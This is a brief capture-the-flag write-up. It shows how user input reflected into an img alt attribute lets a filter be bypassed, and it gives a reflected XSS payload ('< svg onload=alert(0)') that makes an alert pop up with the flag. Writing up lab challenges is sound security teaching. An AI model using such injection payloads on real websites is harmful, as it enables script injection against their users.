## x corp
```
X corp made a new filtration for input data , prove it is secure enough
```

## Solve:

- After visiting the website, we will see an input field.


- Trying to enter *elitebaz* as an input, we will see that it is reflected in the source code.
    ```html
    <center><span> <img style='width:20%;' src='./759511.jpg' alt='elitebaz > 
    ```


- Now, let's craft an XSS payload
    ```html
    < svg onload=alert(0)
    ```


- On submitting an alert will pop up with the flag.

> **Flag: Flag{X55_D4mn_G00D}**